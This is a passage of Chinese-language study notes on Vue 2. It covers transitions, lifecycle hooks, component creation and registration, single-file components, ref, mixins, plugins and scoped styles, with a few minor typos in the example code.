        {id:1, name:'算法导论', date:'2006-9', price:85.00, count:1},
        {id:2, name:'UNIX编程艺术', date:'2006-2', price: 59.00, count:1},
        {id:3, name:'编程珠玑', date:'2008-10', price:39.00, count:1},
        {id:4, name:'代码大全', date:'2006-3', price:128.00, count:1},
      ]
    },
    methods: {
      decrement(index) {
        this.books[index].count--;
      },
      increment(index) {
        this.books[index].count++;
      },

      removeHandle(index) {
        this.books.splice(index, 1);
      }
    },
    
    filters: {
      showPrice(price) {
        return '$' + price.toFixed(2);
      }
    },

    computed: {
      totalPrice() {
        let totalPrice = 0;
        for(let i=0; i<this.books.length; i++) {
          totalPrice += this.books[i].price * this.books[i].count;
        }
        return totalPrice;
      }
    }
  })
 -->

--------------------------

### Vue 动画效果
- 操作 css 的 transition 或 animation
- vue 会给目标元素添加 / 移除特定的class 

> 动画使用方式

> 1. 定义一个动画
- 我们在组件内部定义一个动画 内部使用vue定义好的类名
- 进入时候要激活的样式： .v-enter-active
- 离开时候要激活的样式： .v-leave-active
<!-- 
  .come {     ---- 类名改成： .v-enter-active
    animation: move 1s
  }

  .go {       ---- 类名改成： .v-leave-active
    animation: move 1s reverse
  }

  @keyframes move {
    from {
      transform: translateX(-100px)
    }
    to {
      transform: translateX(0px)
    }
  }

  我们只要把两个类名 和 一个动画准备好
  <transition>目标<transition>一包裹 完活
 -->


> 2. 使用 <transition> 将要发生动画的元素 包裹起来
- 我们看看谁要做动画 谁做动画就用 <transition>目标<transition> 进行包裹
<!-- 
  <transition>
    <h1 v-show='isShow'>你好啊</h1>
  <transition>
 -->

- 属性：
  <transition name='任意名字'> 
  应用场景：
  当页面上有多个元素需要过渡或者动画的时候 要写上各自的名字

  如果我们给标签起名字了 那么 css样式的里就不能使用默认的v-了要改成下面的样式
<!-- 
  .v-enter-active { }

  .任意名字-enter-active { }
 -->

  <transition :appear='true'>
  一上来先自动播放次动画


> 总结：
- <transition> vue在解析的时候会将这个标签脱掉



> 过渡的使用方式
- 我们先准备好两个样式 
- 一个元素从没有在我们的视线 出现在 我们的视线 这个过程叫做来
- 在这个来的过程当中 vue在目标元素上加了3个类名

    .hello-enter      进入的起点  相当于 动画里面的from
    .hello-enter-to   进入的终点  相当于 动画里面的to
    .hello-enter-active   过程中


    .hello-leave      离开的起点  相当于 动画里面的from
    .hello-leave-to   离开的终点  相当于 动画里面的to
    .hello-enter-active   过程中

> 使用方式
- 使用 <transition name='hello'> 标签对元素进行包裹
- 定义进入 和 离开时候的样式 注意进入要有from和to

<!-- 
  <transition name='hello'>
    <h1 v-show='isShow'>你好啊</h1>
  <transition>

  h1 {
    transition: 0.5s    // 我们可以不在这里写这个过渡
  }
  

  // 进入时候的过渡动画
  .hello-enter {
    transform: translateX(-100px)
  }

  .hello-leave-to {
    transform: translateX(0px)
  }

  .hello-enter-active {
    transition: 0.5s    // 我们在这里面写也一样
  }


  // 离开时候的过渡动画
  .hello-leave {
    transform: translateX(0px)
  }

  .hello-leave-to {
    transform: translateX(-100px)
  }
 -->


> 多个元素使用过渡的时候可以这样
- 使用 <transition-group> 对多个元素进行包裹
- 内部每一个元素要有key值
- 里面的元素都是一个过渡动画
<!-- 
  <transition-group>
    <h1 v-show='isShow' key='1'>你好啊</h1>
    <h1 v-show='isShow' key='2'>你好啊</h1>
  </transition-group>
 -->


> 集成第三方过渡动画
- 上面的例子中所有的动画都是我们自己写的 比如使用了animation 或者 transition来实现的动画效果

- 但是git上有很多已经成型的第三方库 

> 安装
- npm install animate.css --save

> 引入
- import "animate.css"

> <transition name='animate__animated animate__bounce'>
- 配置 animate 指定的动画库 接下来我们再定义具体动画的时候 vue就知道执行哪里的类名了 

> <transition> 内部 通过 订制的类名 添加网站中 离开和进入的动画 类名
- https://animate.style/

  <transition
    name='animate__animated animate__bounce'
    enter-active-class='找个好玩的动画类名'
    leave-active-class='找个好玩的动画类名'
  >


> 总结：
- 如果我们想用 动画写 那么使用 v-enter-acitve 和 v-leave-active 就够用了
- 如果我们想用 过渡写 那么就要分别设置from to的类名

--------------------------

### 生命周期
- 生命周期回调函数 生命周期函数 生命周期钩子 vue在关键时刻帮我们调用的一些特殊名称的函数
- 生命周期函数的书写位置和el methods等同级
<!-- vue发现了模板开始解析 生成虚拟DOM 然后转成真实DOM 然后挂载到页面上 -->

- 生命周期函数里面的this是vm 或 组件的实例对象


> 挂载流程
- 初始化部分：
- 该阶段会执行1次
  new Vue()  --  
  beforeCreate  --  created  --  beforeMount  --  mounted


- 更新部分：
- 该阶段会执行N次
- 在初始化阶段是没有新旧的虚拟DOM比较的 但是在更新的时候就有这个环节
  beforeUpdate  --  updated


- 销毁部分：
- 当我们调用 vm.$destory() 的时候进入销毁流程 此时能访问到数据和事件 但是对数据的修改不再会触发更新了

- 完全效果一个示例 清理它与其它组件的链接 解绑它的全部指令以及自定义事件的监听器 注意销毁后原生的dom事件还在
- 当vm被销毁后 页面的数据还是有的 只是vm走了成果还在 只不过dom没人帮我们管理了
<!-- 
  this.$destory()
 -->


> 流程图
<!-- 
                       new Vue()
                          ↓
                Init Event & Lifecycle
          初始化：生命周期 事件 但数据代理还未开始
  (此阶段在制定规则 比如生命周期有多少个 都叫什么 什么时候调用他们)

                          ↓

                    beforeCreate
                    (生命周期函数)
    创建之前，此时 无法通过vm访问到data中的数据，methods中的方法
          也就是说它是在数据代理 和 数据监测创建之前
    
                          ↓

            Init Injections & reactivity
               初始化：数据监测 数据代理

                          ↓

                       created
                     (生命周期函数)
  创建完毕，此时 可以通过vm访问到data中的数据，methods中配置的方法
  
                          ↓

        根据我们传入的配置开始判断 以什么作为模板来解析
  (有没有传递el配置项 如果传递了同时没有传递template配置项
                    那么<div id='root'>这个整体的区域就作为模板)
在此阶段Vue开始解析模板 生成虚拟DOM(内存中) 注意页面还不能显示解析好的内容

                  在这步里已经出现了虚拟DOM
                  
                          ↓

                     beforeMount
                     (生命周期函数)
  此时：1 页面呈现的是 未经Vue编译的DOM结构 2 所有对DOM的操作最终都不奏效
          Vue已经把模板解析好 但是还没有网页面上放
          
                          ↓

          create vm $el and replace el with it
            将内存中的虚拟DOM转为真实的DOM插入页面
            
                          ↓

                        mounted
                     (生命周期函数)
  此时： 1 页面中呈现的是经过vue编译的DOM 2 对DOM的操作均有效(尽可能避免)至此初始化过程结束

  一般在此进行 开启定时器 发送网络请求 订阅消息 绑定自定义事件 等 初始化操作
  

      // 如果我们修改了数据的话 会进入更新流程 然后进入销毁流程// 
                          ↓

                     beforeUpdate
                     (生命周期函数)
      此时：数据是新的 但页面是旧的 即：页面尚未和数据保持同步
      
                          ↓

           Virtual DOM re-render and patch 
  根据新数据 生成新的虚拟DOM 随后与旧的虚拟DOM进行比较 最终完成页面的更新 即： 完成了 Model - > View的更新
  
                          ↓

                        Update
                     (生命周期函数)
      此时：数据是新的 页面也是新的 即： 页面和数据保持同步
      
                          ↓

      // 当vm.destroy() 方法被调用的时候 会入销毁流程 // 
                          ↓

                    beforeDestory
                    (生命周期函数)

        注意 在此阶段对数据的操作 页面都不会再更新了

  此时： vm中所有的 data methods 指令等等都处于可用状态 马上要执行销毁过程 
  一般在此阶段 关闭定时器 取消订阅消息 解绑自定义事件等收尾动作

                          ↓

                      destoryed
                     (生命周期函数)

 -->




> beforeCreate（数据代理 监测 创建前）
> created（数据代理 监测 创建后）
<!-- 
  当组件被创建出来之后, 会回调的一个生命周期函数, 一旦这个组件被创建出来了就会回调这个函数
 -->


> beforeMount（载入前）
- 完成el和data初始化，在挂载开始之前被调用
- 可以发送数据请求
- 在服务器端渲染期间不会被调用


> 组件模板内容被挂载到DOM的时候, 执行该回调
> mounted
- Vue完成模板的解析并把初始的真实的DOM元素放入页面后(挂载完毕)调用mounted生命周期函数
- 该函数只调用一次 初始的真实DOM挂载 以后再发生变化那就叫做更新了


> beforeUpdate（更新前）
- 数据更新时调用
- 挂载完成之前访问现有DOM，比如手动移除已添加的事件监听器；也可以进一步修改数据
<!-- 
  在服务器渲染期间不会被调用，只有初次渲染会在服务端调用
 -->


> 页面刷新, 执行该回调
> updated（更新后）
- 当页面发生更新的时候会调用这个函数
<!-- 
  比如我们的组件data中有message数据, 我把这个message数据放到组件的模板里面{{message}}, 因为这个是动态的, 假如data中的数据发生改变的时候, 页面就会刷新为了显示最新的数据

  只要界面一更新完的时候就会执行这个updated()函数
 -->


> vm.$destory()
> this.$destory()
- 自杀 销毁组件 开发的时候很少这么干 开发的时候都是他杀没的


> beforeDestory（销毁前）
- 在这里一般做一些收尾的工作 比如清除定时器
- 下面处于组件销毁的阶段, 该阶段没有数据绑定 没有交互了
<!-- 
  服务器端渲染期间不会被调用

  created() {
     this.count()
   },

   methods: {
     count() {
       this.timer = setInterval(() => {
         this.num++
         console.log(this.num)
       }, 1000)
     }
   },

   beforeDestroy() {
     clearInterval(this.timer)
   },
   destroyed() {
     console.log("我被销毁了")
   },
 -->


> destoryed（销毁后）
- vue实例销毁后调用。调用后，Vue实例指示的所有东西都会被解绑定，所有的事件监听器会被移除，所有的子实例也会被销毁
- 提示已删除
<!-- 
  服务器端渲染期间不会被调用
-->


- 下面两个函数 只有该组件被保持了状态使用了<keep-alive>时才是有效的
- 我们可以看看接下来的例子
> 当页面处于活跃状态的时候, 执行该回调
> activated() { ... }


> 当页面不处于活跃状态的时候, 执行该回调
> deactivated() { ... }


> 是否能获得节点
<!-- 
  生命周期    是否获取dom节点    是否可以获取data    是否获取methods
  beforeCreate      否                否                否
  created           否	              是	              是
  beforeMount       否	              是	              是
  mounted           是	              是	              是
 -->


> 另一种生命周期函数
> this.$nextTick(() => { })
- nextTick 有下一轮的意思 所以是一次重新渲染模板之后再执行回调的逻辑
- 当页面上元素被重新渲染之后才会执行回调中的代码

- 它会在DOM重新渲染完毕 解析完毕之后执行内部的回调 它能确保我们得到了最新的DOM节点后 再去对节点进行操作

- 应用场景：
- 当改变数据后 要基于更新后的新DOM
- 当改变数据后 要基于更新后的新DOM
- 当改变数据后 要基于更新后的新DOM 进行某些操作的时候 要在nextTick所指定的回调函数中执行

- 作用：
- 在下一次DOM更新结束后执行其指定的回调


> 总结
- 常用的生命周期钩子
- 1. mounted： 发送ajax请求 启动定时器 绑定自定义事件 订阅消息等初始化动作
- 2. beforeDestory： 清楚定时器 解绑自定义事件 取消订阅消息等 收尾工作

- 关于销毁vue实例：
- 1. 销毁后借助vue开发者工具看不懂任何信息
- 2.  销毁后自定义事件会失效 但原生dom事件依然有效
- 3. 一般不会在beforeDestory操作数据 因为几遍操作数据 也不会再触发更新流程了

--------------------------

### 什么是组件化
- 人面对复杂问题的处理方式
- 任何一个人处理信息的逻辑能力都是有限的, 所以当面对一个非常复杂的问题的时候, 我们不太可能一次性搞定一大堆的内容

- 但是 我们人有一种天生的能力, 就是将问题进行拆解, 如果将一个复杂的问题, 拆分成很多个可以处理的小问题, 再将其放在整体当中, 你会发现大的问题也会迎刃而解


> 组件化的思想
- 如果我们将一个页面中所有的处理逻辑全部放在一起, 处理起来就会变得非常的复杂, 而且不利于后续的管理以及扩展
- 但如果, 我们将一个页面拆分成一个个小的功能块, 每个功能块完成属于自己这部分独立的功能, 那么之后整个页面的管理和维护就变得非常的容易了


> 组件的定义
- 实现应用中局部功能代码和资源的集合
- 每一个部分都有自己的html css js文件 形成属于这一个部分的结构样式交互方便复用

--------------------------

### 组件化编码的流程
- 1. 拆分组件
<!-- 
  拆分组件:
  1. 做之前先分析, 页面上我们应该划分几个组件来开发
  2. 按照组件 将原页面对应的dom部分 粘贴到 组件的template中
  3. 还要将css样式也按组件来粘贴进去
 -->

- 2. 静态组件
<!-- 
  静态组件显示在页面 数据是固定的 没有交互
 -->

- 3. 动态组件
<!-- 
  动态组件两个方面是动态
  1. 动态显示
  2. 交互
 -->

- 当有很多组件的时候, 数据放在哪个组件里面, 那就要看这个数据是某些组件要用到还是某个组件中要用到
- 如果是某些组件要用到 那就放在公共的父组件里面

> 注意:
- 数据在哪个组件, 更新数据的行为(方法) 就应该定义在哪个组件

--------------------------

### 创建组件
- 组件的创建分为两种形式
- 1. 非单文件组件
- 2. 单文件组件


> 非单文件组件
- 定义：
- 一个文件中包含有n个组件
<!-- 
  1个html里面有4个组件
 -->


> 单文件组件
- 定义：
- 一个.vue文件里面就是一个组件


### 非单文件组件的书写方式
- 就是一个html文件里面定义好多个组件 互相嵌套使用

- 比如我们一个html页面中有两个组件 那么我们就需要在这个html文件中创建两个组件是么
- vue中普通创建组件要分为3步
- 1. 创建组件 Vue.extend
- 2. 注册组件 components / Vue.component
- 3. 使用组件


> 1. 创建组件
> Vue.extend({配置对象})
- 通过该方法创建一个组件
- 参数：
- 配置对象是用于配置该组件相关内容的 其配置项的内容和new Vue的时候基本一致
- 啥不一致呢？
<!-- 
  1. 定义组件时不要写el配置项：
        因为组件是vm(vue实例)下面的所有组件被vm管理 vm来决定整个组件为哪个容器服务

  
  2. 组件内部的data配置项要写成一个函数 不要写对象的形式
        如果组件中使用了对象形式的data 3组件都引用了这个data当一个修改的时候回影响到其它的组件
        function data() {
          return { a: 1 }
        }

        const c = data()    // 这样c会有一个全新的对象
        const d = data()    // 这样d也会有一个全新的对象

  
  3. 使用 template 配置项 在组件内部定义模板
 -->


> 2. 局部 和 全局 注册组件
- 方式1： 注册局部组件
- 在vm上使用新的配置项 components 它的类型是一组组的kv
<!-- 
  - 我们在创建组件的时候用于接收的变量并不是组件名 真正的组件名是在components里面定义的 当然你也可以接收名 和 组件名起一样的

  - 接收明只是用于找到该组件 并不是 给该组件起名字

  components: {
    组件名： 创建组件时候定义的接收变量
  }
  -->


- 方式2： 注册全局组件
> Vue.component('组件名', '组件在哪')
- 全局定义的组件 全局可用

- 参数1：
- 组件名就是我们以后要使用的组件标签

- 参数2：
- 组件在哪就是我们创建组件的时候 定义的接收变量
- 也可以直接将创建组件的配置对象填写到参数2的位置
<!-- 
  Vue.component('student', {组件的配置项})
 -->



> 3. 使用组件标签
- 使用组件标签的形式在div#root里面使用
<!-- 
  <Student></Student>
 -->


> 代码部分
<!-- 
  <div id="root">
    // 使用 组件标签
    <Student></Student>
  </div>


  // 在学生组件中 定义template 和 data
  const Student = Vue.extend({
    data() {
      return {
        name: 'sam',
        age: 18
      }
    },
    template: `             多级结构要使用根标签包裹
    <div>
      <h3>学生组件</h3>
      <h3>{{name}}</h3>
      <h3>{{age}}</h3>
    </div>
      
    `
  })


  // 在Vue实例中注册组件
  new Vue({
    el: '#root',
    components: {
      Student
    }
  })
 -->


**组件当中需要注意的点：**
> 组件名：
- 1. 如果组件名是一个单词组成 可以使用纯小写字母 或者 纯大写字母的形式
    eg：components:{ student: 创建组件时定义的接收组件的变量}


- 2. 如果组件名是多个单词组件 
  - 全部小写 多个单词之间使用 - 来连接  my-student
    eg：components:{ 'my-student': 创建组件时定义的接收组件的变量}
  

  - 多个单词的首字母全部大写 (仅在脚手架环境里面才可以使用该方式)
    eg：components:{ MyStudent: 创建组件时定义的接收组件的变量}


- 3. 不要使用html标签名作为组件名


> 组件中的name配置项是在开发者工具中呈现的名字
- 该怎么注册怎么注册 name配置项只是在开发者工具上使用的名字


> 组件标签
- 可以写自闭合标签的形式 但是必须保证在脚手架的环境下 普通引入vue.js文件的环境不能使用该形式

--------------------------

### 注册组件的语法糖
- 在上面注册组件的方式, 可能会有些繁琐
  - Vue为了简化这个过程, 提供了注册的语法糖
  - 主要是省去了调用 Vue.extend()的步骤, 而是可以直接使用一个对象来代替


> 前面的创建 和 注册的方式
  - 1. 创建组件
  const 接收变量 = Vue.extend({
    template:`
      内容...
    `
  })

  - 2. 注册组件
  Vue.component('组件名', 创建组件的接收变量);


> 全局注册组件的语法糖
- 把在extend()方法中传递的对象里面的内容 直接作为component的第二个参数
  Vue.component('组件名', {
    template:`
      内容...
    `
  });
<!-- 内部其实还是调用了extend()方法 这种方式写起来简单一些 -->


> 局部注册组件的语法糖
- 在components属性中 组件标签名: 组件构造器(把模板内容直接写在这里)

  components: {
    '组件名': {
      template:`
        内容...
      `
    }
  }

--------------------------

### 父组件 和 子组件 组件的嵌套
- 在哪个组件中注册的 就去那个结构当中写组件标签

> 在一个组件(A)中注册另一个组件(B) 它们的关系就是父子组件
- 子组件可以在父组件的template中使用, 这样在被管理区域内使用父组件的标签, 会带上子组件的内容 


> 父组件内注册子组件的方式
- 在创建父组件配置对象中使用components属性
<!-- 
  const son = Vue.extend({
    template:`
      <div>
        <h2>我是子组件的标题</h2>
        <h4>我是子组件的内容~~~</h4>
      </div>
    `
  })

  const fatherC = Vue.extend({
    template:`
      <div>
        <h2>我是父组件的标题</h2>
        <h4>我是父组件的内容~~~</h4>
      </div>
    `,

    // 在父组件中注册子组件
    components: {
      'cpn-son':son
    }
  })
 -->


> 注意要点
- 1. 先创建子组件构造器, 再创建父组件构造器 也就是说父组件要在下面
- 2. 组件构造器的template中必须有一个根元素(也就是必须是一个div)
- 3. 在父组件中注册的子组件, 只能通过父组件来调用 不能单独调用(要想单独调用要在全局 或 局部进行注册)
- 4. 子组件只能在父组件中被识别


> 代码部分:
<!--  

  <div id="app">

    // 4. 在被管理区域内使用父组件(自动调用了子组件的内容)
    <cpn-father></cpn-father>
  </div>


  // 1. 先创建子组件
  const son = Vue.extend({
    template:`
      <div>
        <h2>我是子组件中的标题</h2>
        <h4>我是子组件中的内容~~~</h4>
      </div>
    `
  })


  // 2. 在创建父组件, 并在父组件中注册子组件
  const father = Vue.extend({
    template:`
      <div>
        <h2>我是父组件中的标题</h2>
        <h4>我是父组件中的内容~~~</h4>

        <cpn-son></cpn-son>
      </div>
    `,
    components: {
      'cpn-son':son
    }
  })


  // 3. 将父组件在vue实例中注册
  let app = new Vue({
    el:'#app',
    components: {
      'cpn-father': father
    }
  })

  <div id='app'>
    <cpn-father></cpn-father>

    // 不能使用 因为son组件是在father组件中定义的
    <cpn-son></cpn-son>        
  </div>

  // 原因:
  在被管理区域内使用father组件的时候, father组件中template中的内容就已经被编译好了(里面是father的完整内容+son的完整内容)

  vue会先解析father中的template中的内容 在解析模板的过程中就发现了有cpn-son的组件标签, 这时候vue就会优先在自己的组件内部去找有没有被注册过 如果有找到 vue就会将cpn-son对应的模板里的内容 直接拿到父组件的模板内做一个粘贴(把内容替换掉cpn-son的标签), 如果自己组件内部没有它会去全局里面找, 找到也会做相对应的替换, 因为spn-son根本就没有经过vue实例对象, 所以vue实例对象压根就不知道cpn-son的存在

  所以这时候我们在被管理区域使用cpn-son的话 就会报错因为vue实例对象根本不知道cpn-son
 -->


> 开发中的标准化嵌套
- 创建一个一人之下 万人之前的app 将app组件注册到vm下也就是new vue配置对象里面，将其他的组件注册到app下
<!-- 
  vm -> app -> 各个组件
 -->

--------------------------

### VueComponent构造函数
- 这节里面我们了解一下组件是什么样的数据类型
<!-- 
  const Student = Vue.extend({
    data() {
      return { name: 'sam', age: 18 }
    },
    template: `
    <div>
      <h3>学生组件</h3>
      <h3>{{name}}</h3>
      <h3>{{age}}</h3>
    </div>
      
    `
  })

  new Vue({
    el: '#root', components: { Student }
  })
 -->

- 我们尝试的看下 console.log(Student) 发现 它的本质就是一个构造函数 那既然是一个构造函数 那么当我们使组件的时候 就应该在前面加一个new吧 可是我们没调用啊
<!--  
  // Vue组件
  ƒ VueComponent (options) {
      this._init(options);
    }
 -->


> 总结
- 1. Student组件本质是一个名我VueComponent的构造函数 且不是程序员定义的 是Vue.extend生成的

- 2. 我们只需要写<Student /> vue在解析的时候就会帮我们创建Student组件的实例对象 即vue帮我们执行的 new VueComponent() 

- 3. 特别注意： 每次调用Vue.extend 返回的都是一个全新的VueComponent

- 4. 关于this指向
    组件配置中：
    data函数 methods中的函数 watch中的函数 computed中的函数 他们的this均是 VueComponent实例对象

    new Vue配置中
    data函数 methods中的函数 watch中的函数 computed中的函数 他们的this均是 Vue实例对象

- 5. VueComponent实例独享 以后简称vc 也可以称之为组件实例对象 Vue的实例对象简称vm

--------------------------

### 内置关系
- VueComponent.prototype.__proto__ === Vue.prototype
- 让组件实例对象可以访问到vue原型上的属性和方法

- 上面是总结 而实际上是这样的
<!-- 
  我们new Vue 会创建出来vue的实例对象 vue的实例对象的隐式原型属性一定指向它的缔造者的显式原型属性

  // vue
  Vue  - Vue.prototype -  
                          ↘
                              Vue的原型对象
                          ↗
  Vm   - Vm.__proto__ -

                                              ↖
                                                ↖
                                                  ↖
  // vuecomponent
  vuecomponent  - Vue.prototype -  
                                ↘
                                    vuecomponent的原型对象
                                ↗
  Vc   - Vc.__proto__ -


  Vue的原型对象 vuecomponent的原型对象 都是对象 它们两个肯定也会有 Vc.__proto__
  指向的是object的原型对象

  但是 vue 这时候做了一步
  VueComponent.prototype.__proto__ === Vue.prototype

  没有让组件实例的原型对象指向object的原型对象 而是 指向了vue的原型对象
 -->

- 让组件实例对象vc可以访问到vue原型上的属性和方法

--------------------------

### Vue里 单文件组件的书写方式
- 非单文件组件不好的地方就是 结构不清晰 所有的组件都放在了一个html文件内部 同时 如果我们想给组件里面的结果添加样式的话 必须要到html文件的上方的<style>标签中书写 这样不太像组件化的逻辑


- 单文件组件的后缀都是以.vue的方式结尾的
- 这种 .vue 文件我们直接交给浏览器 浏览器是没办法运行的 所以要是想让浏览器认识那么我们必须对这种文件进行加工

- 加工的途径有两种：
- 1. webpack
- 2. 脚手架

- 这里我们在给 .vue 文件起名字的时候我们还要注意下
<!-- 
  一个单词的 组件名
    school.vue  /  School.vue
    
  多个单词的 组件名
    MySchool.vue  /  my-school.vue
 -->


- 我们创建一个 Test.vue 文件
- 那么 Test.vue 文件中应该怎么写比较好呢？ 我们回想一下 组件的定义 一个标准的组件应该有三个部分是么 html js css 为了迎合这三个部分 vue给我们设计了与之对应的三个标签


> 单文件组件内的结构
<!-- 
  <template>
    // 组件的结构
  </template>


  <script>
    // 组件的交互相关的代码 数据 和方法等等
       我们定义的组件最终需要别的文件来引入 所以 我们这个部分应该将我们定义的组件暴露出去

    —— 暴露的方式1
    export const Test = ...      // 分别暴露

    —— 暴露的方式2
    const Test = ...
    export {Test}               // 统一暴露

    —— 暴露的方式3
    extend default {直接暴露组件的配置对象}     // 默认暴露
  </script>


  <style>
    // 组件的样式
  </style>
 -->


> 要点：
- 1. 我们一般采用的是 默认暴露的方式 因为引入文件的时候好整
- 2. export default 直接暴露 组件的配置对象
<!-- 
  正常我们创建组件的时候会使用 Vue.extend({ })
  但是这个方法在我们写组件标签的时候vue会自动帮我们调用 所以我们可以省略Vue.extend({ }) 直接默认暴露 组件的配置对象
 -->

- 3. name配置项 该配置项并不是组件的名字 但最好跟组件的名字写成一样的 该配置项是用来在开发者工具上显示的名字

- 大概的书写方式
<!-- 
  <template>
    <h3>{{name}}</h3>
  </template>

  <script>
  export default {
    name: 'Test',
    data() {
      return {
        name: 'sam'
      }
    }
  }
  </script>

  <style scoped>
    h3 {
      padding: 5px;
      background: deepskyblue;
    }
  </style>
 -->


> app组件
- 注意下 如果我们要写单文件组件的话 一定要创建一个app组件 该组件用来汇总所有的组件
- 1. 引入组件
- 2. 注册组件
- 3. 使用组件
<!-- 
  <template>
    <div>
      <Test />
    </div>
  </template>

  <script>
  // App组件的作用是汇总所有的组件 所以我们要先引入组件
  import Test from './Test.vue'

  export default {
    name: 'App',
    components: {
      Test
    }
  }
  </script>

  <style> </style>
 -->


> main.js文件
- 创建入口文件
- 我们创建的单文件组件会汇总的App组件中 那我们的App组件是不是要在注册到vm里面才可以是么 那怎么创建vm组件呢？可不是通过上面的单文件组件的方式 我们要写js文件 亲自去new Vue

- 1. 引入 App 根组件
- 2. 创建Vue实例
- 3. 注册 App 组件
<!-- 
  // main.js 文件
  import App from './App'

  new Vue({
    el: '#root',
    components: {
      App
    },

    如果不想在index.html文件的root里写 调用app组件标签 也可以写在这里
    template: `
      <App />       
    `
  })
 -->


> index.html
- 该文件用于将组件 main.js 联系在一起 html文件中只写 div#root 就可以
<!-- 
  <body>
    <div id="root">

      // 组件标签也可以写在 配置项的template中
      <App />
    </div>

    // 这里在脚手架中不用 只是写在这里让自己明白逻辑
    <script src="../assets/js/vue.js"></script>
    <script src="./main.js"></script>
  </body>
 -->

--------------------------

### ref属性
- 该属性在标签属性中使用 作用和id一样 可以给一个节点打上标识 用于获取该节点
<!-- 
  <h3 ref='target'>我是App组件</h3>
 -->

> 设置： ref='属性值'
- <h3 ref='target'>我是App组件</h3>


> 获取： this.$refs.ref属性值
- this.$refs.target
- 来获取当前节点
<!-- 
  this.$refs.target.innerHTML = '哈哈'
 -->


> 我们也可以给组件打 ref 那么获取的就是该组件的实例对象
<!-- 
  <Test ref='test' />

  this.$refs.test   // 它就是 Test组件
 -->

- 如果 我们使用ref给DOM标签和组件打标记那么ref 和 id没有什么区别
- 但是 如果我们使用id给组件打标记 那么我们获取的不是组件的实例对象 而是 该组件的DOM结构部分


> 总结：
- 1. 被用来给元素或子组件注册引用信息（id代替者）
- 2. 应用在html标签上获取的是真实DOM元素 应用在组件标签上是组件实例对象（vc）

--------------------------

### 配置项：mixins  混入 / 混合
- 所谓的混入就是当组件中的一个部分完全一样的时候 我们可以将这个部分抽离出来 在各自的组件中删除代码 引入抽离的文件

- 也就是说两个组件共享一个配置 复用配置

> 对于data 和 methods来说
  当混合文件中有 组件内部没有的时候 以混合文件为主
  当混合文件中没有 组件内部有 以组件内部的数据为主

> 对于生命周期函数来说
  没有上面的说法 混合文件中的 和 组件中的都会调用


> 使用场景
- 当组件的配置项中有重复的内容的时候 就可以使用混合 还可以将混合注册为全局混合

<!-- 
  比如 两个组件都有 这样的一个地方 那么我就可以将这个部分抽离成一个js文件
  methods: {
    showName() {
      console.log(this.name)
    }
  }
-->


> 使用方式
- 1. 在 根目录 中创建 mixins 文件夹 里面创建js文件
- 暴露一个对象 对象中是vue的一个个配置项 methods data ...
<!-- 
  export const hunhe = {
    methods: {
      showName() {
        console.log(this.name)
      }
    }
  }
 -->

- 2. 上面把共通代码抽离成了一个js文件 接下来我们就在要使用的组件内部引入他们
- 然后使用 混合配置项

> mixins: []
- 如果有配置项完全一致的时候可以使用混合的功能 抽离相同的配置项 然后在mixins配置项中使用
- 混合是按配置项为单位进行抽离
<!-- 
  import {hunhe} from 'mixin.js'
  mixins: [hunhe]
 -->


> 全局混合
- 使用这种方式的混合所有的vm vc都会得到混合文件中的东西
- 我们在入口文件中 引入混合文件 和 配置

> Vue.mixin()
- 全局配置混合
<!-- 
  import {hunhe, hunhe2} from 'mixin.js'
  Vue.mixin(hunhe)
  Vue.mixin(hunhe2)
 -->

> 总结：
- 1. 混合中的this是该组件的对象
- 2. 混合中的所有数据都会被放在vm身上 所以正常使用数据 和 调用方法就可以

--------------------------

### 插件
- 我们定义一个 plugins.js 文件 写插件

> 插件的定义方法
- vue要求插件必须是一个对象 同时 对象内部含有install方法
- 这个插件vue会帮我们调用 就像是将所有的东西统一安装一样
- install方法中能够接收到 Vue 也就是vm的缔造者
<!-- 
  export default {
    install(Vue, [接收到使用者传递的参数]) {
      比如我们可以在这里面配置n种全局配置 当vue帮我们调用这个install后 vm vc都能使用这些全局配置了

      比如格式化 混入 自定义指令等等
    }
  }
 -->

- 插件就相当于外挂一样，我们一般使用外挂都是先开启外挂然后再进入游戏 vue的插件也是一样的先应用插件然后创建vm


> Vue.use(Vue, [使用者传递的参数])
- vue中使用这个api应用插件
- 应用插件后 vue 会给我们调用 我们定制的插件中的方法
<!-- express里面是使用express.use使用中间件 -->

- 也就是说 入口文件里 创建 new Vue之间我们就先需要应用 我们定义的插件
<!-- 
  import Vue from 'vue'
  import App from './App'

  // 引入插件
  import plugins from './plugins'
  Vue.config.productionTip = false

  // 应用插件
  Vue.use(plugins)

  new Vue({
    el:'#app',
    render: h => h(App)
  })
 -->

--------------------------

### <style scoped lang> 样式
- 我们在组件内写的style样式最终这些样式都会汇总到一起 所以同名的样式会被覆盖掉
- 会按照组件在App的组件中的引入的先后顺序 下面的组件的样式会覆盖掉上面的样式

> <style scoped>
- 解决方式就是在 style标签里面添加 scoped 属性
- 我们加上这个属性之后 该组件内的样式只负责该组件其它的样式不管

- 原理：
- 它会给写样式的div身上加一个自定义属性后面的数字都是随机生成的确保不一样
<!-- 
  <div data-v-234234 class='demo'>
 -->

- 注意：
- app组件不适合使用这个样式 它是所有组件的源头 不加scoped就是修改全局的样式
- 一般App要是写样式了 代表所有组件都会用的


> <style lang='less'>
- 我们在写样式的时候 可以使用less 直接这么写标签就可以了
- 但是需要安装 less-loader

- npm i less
<!-- 
  less版本 4xx 好处 好像也是最新的
 -->

- npm i less-loader@7
<!-- 
  可能会报错 因为不兼容 因为webpack的最新版本已经是5了 但是脚手架的话里面使用的webpack的版本可能是4
  因为我们脚手架里面使用的是4.xx 

  如果我们默认安装less-loader的话就是安装的最新版本 less-loader的最新版本是为了迎合webpack5
  所以就发生了 我们脚手架里面是使用的是4 而我们却用了最新的less-loader
 -->

- 我们在安装less-loader前使用 如下命令 查看 webpack 的最新版本
- npm view webpack versions
- npm view less-loader versions

- 我们可以指定7版本

--------------------------

### Todo案例部分的总结
> 数据放在哪个组件？
- 我们对页面拆分组件后 要想数据在哪个组件展示 我们就放在哪个组件
- 也就是
<!-- 
  todolist案例里面将列表做成了一个组件 -- MyList组件
  将列表中的每一项单独的做成了一个组件 -- MyItem组件

  那就涉及到数据要放在哪里的问题 我们要将数据展示在MyList组件里面 所以我们就放在哪个组件里面
 -->

- MyList组件只负责对数据的展示 并不负责操作数据
- 还可以放在最外层的结构上 这样传递数据的时候 又多了种可以层层传递的技巧


> 向子组件传递数据
- 我们将数据放在了 MyList组件 里面 然后我们根据数据去遍历 列表中的每一项
- 同时我们还要把子组件需要的数据传递进去 我们把 item in todos中的item传递到子组件里面
<!-- 
  // 父组件  传递过去一个todo
  <MyItem v-for='item of todos' :todo='item'>
